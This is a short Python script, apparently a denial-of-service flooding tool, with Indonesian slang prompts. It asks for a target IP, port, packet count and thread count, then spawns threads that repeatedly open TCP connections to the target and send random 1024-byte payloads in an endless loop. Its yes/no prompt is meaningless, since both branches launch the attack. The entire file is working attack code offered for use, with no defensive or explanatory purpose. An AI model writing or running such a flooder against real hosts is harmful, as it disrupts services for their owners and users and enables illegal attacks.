import random
import socket
import threading
import os,sys

print ("""pdpepek

pepepeoek""")
os.system("clear")

ip = str(input("\033[93mip nya asuh:"))
port = int(input("\033[93mport nya asuh:"))
choice = str(input("\033[93mgas ddos gak?(y/n)"))
times = int(input("\033[93mpaket nyA asuh:"))
threads = int(input("\033[93mbonus paket nya:"))
def run2():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" yeh kena ddos gak tuh wlwkwl")
		except:
			s.close()
			print("yeh server nya mataL")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
